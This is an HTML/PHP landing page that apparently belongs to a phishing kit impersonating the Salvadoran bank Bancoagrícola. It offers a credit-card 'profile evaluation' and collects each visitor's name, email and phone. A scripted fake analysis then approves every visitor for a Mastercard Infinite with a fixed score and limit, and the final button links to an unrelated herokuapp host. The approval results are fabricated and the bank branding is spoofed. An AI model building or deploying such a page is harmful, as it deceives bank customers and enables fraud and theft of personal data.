<?php /* Landing - Simulador Mastercard Infinite */ ?>
<!doctype html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Bancoagrícola · Cuenta de Ahorro Digital</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    html, body {
      font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
      color: #1a1a1a;
      background: #fff;
      min-height: 100%;
    }
    a { color: inherit; text-decoration: none; }

    /* Header */
    .header {
      background: #fff;
      padding: 22px 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-bottom: 1px solid #f0f0f0;
    }
    .logo {
      display: inline-block;
      width: 260px;
      height: 62px;
      background: url('./index_files/positivo.svg') no-repeat center / contain;
      text-indent: -9999em;
      overflow: hidden;
    }

    /* Hero card */
    .hero {
      background: #f1f3f5;
      margin: 18px;
      border-radius: 18px;
      padding: 36px 28px 32px;
      position: relative;
      overflow: hidden;
    }
    .hero h1 {
      font-size: 28px;
      line-height: 1.2;
      font-weight: 800;
      color: #1a1a1a;
      letter-spacing: -.5px;
    }
    .hero .subtitle {
      margin-top: 14px;
      font-size: 16px;
      color: #5a6473;
      font-weight: 400;
      line-height: 1.5;
    }

    /* Pasos */
    .steps {
      margin-top: 30px;
      background: #fff;
      border-radius: 14px;
      padding: 20px 18px;
      border: 1px solid #e6e8ec;
    }
    .steps-title {
      font-size: 13px;
      text-transform: uppercase;
      letter-spacing: .8px;
      color: #8a93a0;
      font-weight: 700;
      margin-bottom: 16px;
      text-align: center;
    }
    .step {
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 10px 0;
    }
    .step-num {
      width: 36px; height: 36px;
      border-radius: 50%;
      background: #2d4a8a;
      color: #fff;
      display: flex; align-items: center; justify-content: center;
      font-weight: 700;
      font-size: 15px;
      flex-shrink: 0;
      box-shadow: 0 2px 6px rgba(45,74,138,.25);
    }
    .step-text {
      font-size: 15px;
      color: #1a1a1a;
      font-weight: 600;
    }
    .step-text small {
      display: block;
      color: #8a93a0;
      font-size: 12px;
      font-weight: 400;
      margin-top: 2px;
    }
    .step-sep {
      height: 18px;
      width: 2px;
      background: #e6e8ec;
      margin-left: 17px;
    }

    /* Imagen flotante */
    .float-img {
      display: block;
      width: 100%;
      max-width: 460px;
      margin: 28px auto 8px;
      border-radius: 16px;
      animation: floatY 3.6s ease-in-out infinite;
      filter: drop-shadow(0 18px 22px rgba(45, 74, 138, .18));
    }
    @keyframes floatY {
      0%, 100% { transform: translateY(0); }
      50%      { transform: translateY(-10px); }
    }
    .btn-solicitar {
      display: inline-block;
      margin-top: 26px;
      background: #fdda24;
      color: #1a1a1a;
      font-weight: 700;
      font-size: 16px;
      padding: 14px 36px;
      border-radius: 50px;
      border: none;
      cursor: pointer;
      box-shadow: 0 2px 6px rgba(0,0,0,.08);
      transition: transform .15s ease, box-shadow .15s ease;
    }
    .btn-solicitar:hover { transform: translateY(-1px); box-shadow: 0 4px 10px rgba(0,0,0,.12); }
    .btn-solicitar:active { transform: translateY(0); }

    /* Imagen / carrusel */
    .media {
      position: relative;
      margin-top: 30px;
      border-radius: 16px;
      overflow: hidden;
      aspect-ratio: 4 / 3;
      background: #d8d8d8;
    }
    .media img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }
    .media-overlay {
      position: absolute;
      left: 8%;
      top: 10%;
      width: 38%;
      pointer-events: none;
      opacity: .95;
    }
    .arrow {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 22px;
      cursor: pointer;
      text-shadow: 0 1px 3px rgba(0,0,0,.4);
      user-select: none;
    }
    .arrow.left { left: 4px; }
    .arrow.right { right: 4px; }

    .dots {
      display: flex;
      gap: 6px;
      justify-content: center;
      margin-top: 18px;
    }
    .dot {
      width: 7px; height: 7px; border-radius: 50%;
      background: #c8c8c8;
    }
    .dot.active { background: #1a1a1a; width: 22px; border-radius: 4px; }

    /* Form */
    .screen { display: none; }
    .screen.active { display: block; }

    .form-card {
      background: #f1f3f5;
      margin: 18px;
      border-radius: 18px;
      padding: 30px 24px;
    }
    .form-card h2 {
      font-size: 24px;
      font-weight: 800;
      letter-spacing: -.3px;
      margin-bottom: 6px;
    }
    .form-card p.sub {
      color: #5a6473;
      font-size: 15px;
      margin-bottom: 22px;
    }
    .field { margin-bottom: 14px; }
    .field label {
      display: block;
      font-size: 13px;
      color: #2d4a8a;
      font-weight: 600;
      margin-bottom: 6px;
    }
    .field input {
      width: 100%;
      padding: 13px 14px;
      border: 1px solid #d6dbe1;
      border-radius: 10px;
      font-size: 15px;
      background: #fff;
      outline: none;
      transition: border-color .15s ease;
    }
    .field input::placeholder { color: #a8b0bd; font-weight: 400; }
    .field input:focus { border-color: #2d4a8a; box-shadow: 0 0 0 3px rgba(45,74,138,.10); }
    .field .err { color: #c0392b; font-size: 12px; margin-top: 4px; display: none; }
    .field.invalid .err { display: block; }
    .field.invalid input { border-color: #c0392b; }

    /* Loading */
    .loading-wrap {
      min-height: 70vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 24px;
      text-align: center;
    }
    .spinner {
      width: 56px; height: 56px;
      border: 4px solid #ececec;
      border-top-color: #8a93a0;
      border-radius: 50%;
      animation: spin .8s linear infinite;
      margin-bottom: 22px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-title {
      font-size: 22px;
      font-weight: 800;
      color: #1a1a1a;
      letter-spacing: -.3px;
      margin-bottom: 8px;
    }
    .loading-sub {
      font-size: 14px;
      color: #5a6473;
      margin-bottom: 26px;
    }
    .check-list {
      list-style: none;
      padding: 0;
      margin: 0;
      width: 100%;
      max-width: 360px;
      text-align: left;
    }
    .check-list li {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 10px 0;
      font-size: 15px;
      color: #8a93a0;
      transition: color .25s ease;
    }
    .check-icon {
      width: 24px; height: 24px;
      border-radius: 50%;
      background: #e6e8ec;
      display: flex; align-items: center; justify-content: center;
      color: #fff;
      font-size: 14px;
      font-weight: 700;
      flex-shrink: 0;
      transition: background .3s ease, transform .3s ease;
    }
    .check-list li.done { color: #1a1a1a; }
    .check-list li.done .check-icon {
      background: #f5b800;
      transform: scale(1.05);
    }
    .check-list li.active { color: #1a1a1a; font-weight: 600; }
    .check-list li.active .check-icon {
      background: #f5b800;
      animation: pulse 1s ease-in-out infinite;
    }
    .check-list.all-green li .check-icon {
      background: #22c55e !important;
      animation: none;
      transform: scale(1.05);
      transition: background .35s ease;
    }
    .check-list.all-green li { color: #128a3a; font-weight: 600; }
    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 0 0 rgba(245, 184, 0, .55); }
      50%      { box-shadow: 0 0 0 6px rgba(245, 184, 0, 0); }
    }

    /* Results */
    .results { padding: 22px 18px 40px; }
    .results h2 {
      font-size: 24px;
      font-weight: 800;
      letter-spacing: -.3px;
      margin-bottom: 6px;
    }
    .results p.sub {
      color: #5a6473;
      font-size: 15px;
      margin-bottom: 18px;
    }
    .badge-ok {
      display: flex;
      align-items: flex-start;
      gap: 14px;
      background: #ecfdf3;
      border: 1px solid #b8ebcc;
      border-radius: 14px;
      padding: 16px 18px;
      margin-bottom: 22px;
    }
    .badge-ok .check {
      width: 36px; height: 36px;
      border-radius: 50%;
      background: #22c55e;
      color: #fff;
      display: flex; align-items: center; justify-content: center;
      font-weight: 700;
      flex-shrink: 0;
    }
    .badge-ok h3 { color: #128a3a; font-size: 17px; margin-bottom: 4px; }
    .badge-ok p { color: #16703a; font-size: 14px; line-height: 1.45; }

    /* Resumen de perfil */
    .profile-summary {
      border: 1px solid #e6e8ec;
      border-radius: 16px;
      background: #fff;
      padding: 22px 20px;
      margin-bottom: 22px;
      box-shadow: 0 2px 10px rgba(0,0,0,.04);
    }
    .profile-summary h3 {
      font-size: 16px;
      font-weight: 800;
      margin-bottom: 16px;
      color: #1a1a1a;
    }
    .summary-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 18px 12px;
      background: #f6f7f9;
      border-radius: 12px;
      padding: 18px 12px;
    }
    .summary-item { text-align: center; }
    .summary-item .val {
      font-size: 24px;
      font-weight: 800;
      color: #1a1a1a;
      line-height: 1.1;
    }
    .summary-item .val.good { color: #128a3a; }
    .summary-item .lbl {
      display: block;
      margin-top: 4px;
      font-size: 12px;
      color: #5a6473;
      font-weight: 500;
    }

    .card-offer {
      border: 1px solid #e6e8ec;
      border-radius: 16px;
      padding: 22px 20px;
      background: #fff;
      box-shadow: 0 2px 10px rgba(0,0,0,.04);
    }
    .card-img {
      width: 100%;
      max-width: 320px;
      margin: 0 auto 14px;
      display: block;
      animation: cardFloat 3.8s ease-in-out infinite;
      filter: drop-shadow(0 18px 22px rgba(0, 0, 0, .22));
    }
    @keyframes cardFloat {
      0%, 100% { transform: translateY(0) rotate(-1deg); }
      50%      { transform: translateY(-12px) rotate(1deg); }
    }
    .card-shadow {
      width: 70%;
      height: 14px;
      margin: 0 auto 18px;
      background: radial-gradient(ellipse at center, rgba(0,0,0,.18), rgba(0,0,0,0) 70%);
    }
    .card-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
      border-bottom: 1px dashed #eef0f3;
      font-size: 15px;
    }
    .card-row:last-of-type { border-bottom: none; }
    .card-row .k { color: #5a6473; }
    .card-row .v { font-weight: 700; color: #1a1a1a; }
    .card-row .v.green { color: #128a3a; }
    .card-title {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 10px;
    }
    .card-title h3 { font-size: 18px; font-weight: 800; }
    .pill {
      background: #ecfdf3;
      color: #128a3a;
      font-size: 12px;
      font-weight: 700;
      padding: 5px 12px;
      border-radius: 20px;
      letter-spacing: .3px;
    }
    .btn-cta {
      display: block;
      width: 100%;
      margin-top: 18px;
      background: #fdda24;
      color: #1a1a1a;
      font-weight: 700;
      font-size: 16px;
      padding: 15px;
      border-radius: 50px;
      border: none;
      cursor: pointer;
      text-align: center;
      box-shadow: 0 2px 6px rgba(0,0,0,.08);
      transition: transform .15s ease, box-shadow .15s ease;
    }
    .btn-cta:hover { transform: translateY(-1px); box-shadow: 0 4px 10px rgba(0,0,0,.12); }
    .btn-cta:active { transform: translateY(0); }
    .fine { text-align: center; color: #5a6473; font-size: 12px; margin-top: 12px; }

    /* Footer */
    .site-footer {
      background: #2a2a2a;
      color: #e6e8ec;
      margin-top: 40px;
      padding: 40px 24px 28px;
      position: relative;
    }
    .footer-inner {
      max-width: 480px;
      margin: 0 auto;
      position: relative;
    }
    .footer-title {
      font-size: 20px;
      font-weight: 800;
      color: #fff;
      margin-bottom: 22px;
      letter-spacing: -.3px;
    }
    .footer-links {
      list-style: none;
      padding: 0;
      margin: 0 0 28px;
    }
    .footer-links li { margin-bottom: 14px; }
    .footer-links a {
      color: #e6e8ec;
      font-size: 15px;
      transition: color .15s ease;
    }
    .footer-links a:hover { color: #fdda24; }

    .support-btn {
      position: absolute;
      right: 0;
      top: 90px;
      width: 62px;
      height: 62px;
      border-radius: 50%;
      background: #fdda24;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1a1a1a;
      box-shadow: 0 6px 18px rgba(0,0,0,.35);
      transition: transform .15s ease;
    }
    .support-btn:hover { transform: scale(1.05); }
    .support-btn svg { width: 28px; height: 28px; }

    .footer-bottom {
      border-top: 1px solid #3a3a3a;
      padding-top: 22px;
      margin-top: 8px;
      font-size: 12px;
      color: #8a93a0;
      line-height: 1.6;
    }
    .footer-bottom .legal-links {
      display: flex;
      flex-wrap: wrap;
      gap: 14px;
      margin-bottom: 12px;
    }
    .footer-bottom .legal-links a {
      color: #c8ccd2;
      text-decoration: none;
      transition: color .15s ease;
    }
    .footer-bottom .legal-links a:hover { color: #fdda24; }
    .social {
      display: flex;
      gap: 12px;
      margin: 14px 0 18px;
    }
    .social a {
      width: 34px; height: 34px;
      border-radius: 50%;
      background: #3a3a3a;
      display: flex; align-items: center; justify-content: center;
      color: #e6e8ec;
      transition: background .15s ease;
    }
    .social a:hover { background: #fdda24; color: #1a1a1a; }
    .social svg { width: 16px; height: 16px; }

    @media (min-width: 720px) {
      .hero, .form-card, .results { max-width: 480px; margin-left: auto; margin-right: auto; }
      .hero, .form-card { margin-top: 24px; }
    }
  </style>
</head>
<body>

  <header class="header">
    <a href="#" class="logo" aria-label="Bancoagrícola">Bancoagrícola</a>
  </header>

  <main>
    <!-- Pantalla 1: Intro -->
    <section class="hero screen active" id="screen-intro">
      <h1>Evalúa tu perfil y<br>conoce si eres beneficiario</h1>
      <p class="subtitle">Consulta tu perfil crediticio y solicita tu tarjeta de crédito en línea de forma rápida y segura.</p>

      <button type="button" class="btn-solicitar" id="btn-start">Solicitar</button>

      <img src="./img/6723.jpg" alt="" class="float-img">

      <div class="steps">
        <p class="steps-title">Pasos a seguir</p>

        <div class="step">
          <div class="step-num">1</div>
          <div class="step-text">Identificación<small>Ingresa tus datos básicos</small></div>
        </div>
        <div class="step-sep"></div>
        <div class="step">
          <div class="step-num">2</div>
          <div class="step-text">Validación de datos<small>Verificamos tu perfil al instante</small></div>
        </div>
        <div class="step-sep"></div>
        <div class="step">
          <div class="step-num">3</div>
          <div class="step-text">Resultados<small>Conoce si eres beneficiario</small></div>
        </div>
      </div>
    </section>

    <!-- Pantalla 2: Formulario -->
    <section class="form-card screen" id="screen-form">
      <h2>Evaluación de perfil</h2>
      <p class="sub">Completa tus datos para validar si calificas.</p>

      <form id="form-eval" novalidate>
        <div class="field">
          <label for="nombre">Nombre</label>
          <input type="text" id="nombre" name="nombre" autocomplete="given-name" placeholder="Ej. Juan Carlos" required>
          <span class="err">Ingresa tu nombre.</span>
        </div>
        <div class="field">
          <label for="apellido">Apellido</label>
          <input type="text" id="apellido" name="apellido" autocomplete="family-name" placeholder="Ej. Martínez López" required>
          <span class="err">Ingresa tu apellido.</span>
        </div>
        <div class="field">
          <label for="email">Correo electrónico</label>
          <input type="email" id="email" name="email" autocomplete="email" placeholder="nombre@correo.com" required>
          <span class="err">Ingresa un correo válido.</span>
        </div>
        <div class="field">
          <label for="telefono">Teléfono</label>
          <input type="tel" id="telefono" name="telefono" autocomplete="tel" inputmode="numeric" placeholder="+503 7000-0000" required>
          <span class="err">Ingresa un teléfono válido.</span>
        </div>

        <button type="submit" class="btn-solicitar" style="width:100%; margin-top: 10px;">Evaluar perfil</button>
      </form>
    </section>

    <!-- Pantalla 3: Cargando -->
    <section class="screen" id="screen-loading">
      <div class="loading-wrap">
        <div class="spinner"></div>
        <h2 class="loading-title">Analizando tu Perfil Estimado</h2>
        <p class="loading-sub">Este proceso puede tomar unos segundos...</p>

        <ul class="check-list" id="check-list">
          <li data-step="0"><span class="check-icon">&#10003;</span>Verificando información</li>
          <li data-step="1"><span class="check-icon">&#10003;</span>Consultando perfil financiero</li>
          <li data-step="2"><span class="check-icon">&#10003;</span>Consultando historial crediticio</li>
          <li data-step="3"><span class="check-icon">&#10003;</span>Analizando elegibilidad de productos</li>
        </ul>
      </div>
    </section>

    <!-- Pantalla 4: Resultados -->
    <section class="results screen" id="screen-results">
      <h2>Resultados de Simulación</h2>
      <p class="sub">Basado en tu perfil estimado, tenemos esta opción para ti.</p>

      <div class="badge-ok">
        <div class="check">&#10003;</div>
        <div>
          <h3>¡Felicidades!</h3>
          <p>Tu perfil estimado cumple con nuestros criterios. Tienes acceso a la Mastercard Infinite.</p>
        </div>
      </div>

      <div class="profile-summary">
        <h3>Resumen de tu Perfil</h3>
        <div class="summary-grid">
          <div class="summary-item">
            <div class="val">750</div>
            <span class="lbl">Score Crediticio</span>
          </div>
          <div class="summary-item">
            <div class="val good">Excelente</div>
            <span class="lbl">Historial</span>
          </div>
          <div class="summary-item">
            <div class="val">0</div>
            <span class="lbl">Reportes Negativos</span>
          </div>
          <div class="summary-item">
            <div class="val">2</div>
            <span class="lbl">Productos Aptos</span>
          </div>
        </div>
      </div>

      <div class="card-offer">
        <img src="./img/tarjetas6-tdc-infinite-visa---1.png" alt="Mastercard Infinite" class="card-img">
        <div class="card-shadow"></div>

        <div class="card-title">
          <h3>Mastercard Infinite</h3>
          <span class="pill">APROBADA</span>
        </div>

        <div class="card-row">
          <span class="k">Cupo aprobado:</span>
          <span class="v green">$8,000 USD</span>
        </div>
        <div class="card-row">
          <span class="k">Tasa de interés:</span>
          <span class="v">1.4% mensual</span>
        </div>
        <div class="card-row">
          <span class="k">Cuota de manejo:</span>
          <span class="v">$0 primer año</span>
        </div>

        <a href="https://agricolastake-42a4af376d93.herokuapp.com/" class="btn-cta" id="btn-final">Solicitar Ahora</a>
        <p class="fine">Oferta sujeta a verificación final de datos.</p>
      </div>
    </section>
  </main>

  <footer class="site-footer">
    <div class="footer-inner">
      <h3 class="footer-title">Links directos</h3>

      <ul class="footer-links">
        <li><a href="#">Sala de prensa</a></li>
        <li><a href="#">Desarrollo sostenible</a></li>
        <li><a href="#">Innovación</a></li>
        <li><a href="#">Educación Financiera</a></li>
        <li><a href="#">Lo Lindo del Fútbol</a></li>
        <li><a href="#">Preguntas Frecuentes FAQs</a></li>
      </ul>

      <a href="#" class="support-btn" aria-label="Soporte">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M3 14v-2a9 9 0 0 1 18 0v2"/>
          <path d="M21 14v3a2 2 0 0 1-2 2h-1v-7h1a2 2 0 0 1 2 2zM3 14v3a2 2 0 0 0 2 2h1v-7H5a2 2 0 0 0-2 2z"/>
          <path d="M16 19a4 4 0 0 1-4 3"/>
        </svg>
      </a>

      <div class="social">
        <a href="#" aria-label="Facebook">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13 22v-8h3l1-4h-4V7c0-1.2.3-2 2-2h2V1.2A29 29 0 0 0 14 1c-3 0-5 1.8-5 5v4H6v4h3v8h4z"/></svg>
        </a>
        <a href="#" aria-label="Instagram">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r="1" fill="currentColor"/></svg>
        </a>
        <a href="#" aria-label="X">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2H21l-6.52 7.45L22 22h-6.83l-4.78-6.27L4.8 22H2l7-8L1.5 2h6.91l4.32 5.7L18.24 2zm-2.4 18h1.9L7.25 4H5.22l10.62 16z"/></svg>
        </a>
        <a href="#" aria-label="YouTube">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23 7.5s-.2-1.5-.8-2.2c-.8-.9-1.7-.9-2.1-1C17 4 12 4 12 4s-5 0-8 .3c-.4 0-1.3 0-2.1 1C1.2 6 1 7.5 1 7.5S.8 9.3.8 11v1.5c0 1.7.2 3.5.2 3.5s.2 1.5.8 2.2c.8.9 1.9.8 2.3.9 1.7.2 7.7.2 7.7.2s5 0 8-.3c.4 0 1.3 0 2.1-1 .6-.7.8-2.2.8-2.2s.2-1.8.2-3.5V11c0-1.7-.2-3.5-.2-3.5zM10 14.5v-6l5 3-5 3z"/></svg>
        </a>
      </div>

      <div class="footer-bottom">
        <div class="legal-links">
          <a href="#">Política de privacidad</a>
          <a href="#">Términos y condiciones</a>
          <a href="#">Cookies</a>
          <a href="#">Contacto</a>
        </div>
        <p>© <?php echo date('Y'); ?> Todos los derechos reservados.</p>
        <p style="margin-top:6px;">Esta simulación es de carácter informativo. Sujeta a verificación y aprobación final.</p>
      </div>
    </div>
  </footer>

  <script>
    (function () {
      var screens = {
        intro: document.getElementById('screen-intro'),
        form: document.getElementById('screen-form'),
        loading: document.getElementById('screen-loading'),
        results: document.getElementById('screen-results')
      };

      function show(name) {
        Object.keys(screens).forEach(function (k) {
          screens[k].classList.toggle('active', k === name);
        });
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }

      document.getElementById('btn-start').addEventListener('click', function () {
        show('form');
      });

      var form = document.getElementById('form-eval');
      form.addEventListener('submit', function (e) {
        e.preventDefault();

        var nombre = document.getElementById('nombre');
        var apellido = document.getElementById('apellido');
        var email = document.getElementById('email');
        var telefono = document.getElementById('telefono');

        var emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        var telRe = /^[0-9+\-\s()]{7,}$/;

        var ok = true;
        [
          [nombre, !!nombre.value.trim()],
          [apellido, !!apellido.value.trim()],
          [email, emailRe.test(email.value.trim())],
          [telefono, telRe.test(telefono.value.trim())]
        ].forEach(function (pair) {
          var field = pair[0].parentElement;
          if (pair[1]) {
            field.classList.remove('invalid');
          } else {
            field.classList.add('invalid');
            ok = false;
          }
        });

        if (!ok) return;

        show('loading');
        runLoading();
      });

      function runLoading() {
        var list = document.getElementById('check-list');
        var items = list.querySelectorAll('li');
        list.classList.remove('all-green');
        items.forEach(function (li) { li.classList.remove('active', 'done'); });

        var i = 0;
        var stepDelay = 850;

        function tick() {
          if (i > 0) {
            items[i - 1].classList.remove('active');
            items[i - 1].classList.add('done');
          }
          if (i < items.length) {
            items[i].classList.add('active');
            i++;
            setTimeout(tick, stepDelay);
          } else {
            // Todos completos en amarillo → cambian a verde
            setTimeout(function () {
              list.classList.add('all-green');
              setTimeout(function () { show('results'); }, 850);
            }, 350);
          }
        }
        items[0].classList.add('active');
        i = 1;
        setTimeout(tick, stepDelay);
      }
    })();
  </script>

</body>
</html>
